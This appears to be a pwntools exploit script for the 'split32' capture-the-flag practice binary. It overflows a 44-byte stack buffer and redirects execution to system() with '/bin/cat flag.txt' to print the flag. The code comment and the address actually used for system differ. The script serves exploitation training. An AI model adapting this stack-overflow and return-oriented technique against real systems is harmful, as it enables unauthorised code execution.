from pwn import *
import sys

# Address of usefulfunc 0x8048649
# Address of /bin/cat flag.txt 0x804a030
# Address of system@plt 0x08048430

buf = ""
buf += "A"*44

buf += p32(0x8048657) # system@plt
buf += p32(0x804a030) # /bin/cat flag.txt

b = process("./split32")
b.recv()
b.sendline(buf)
sys.stdout.write(b.recvall())
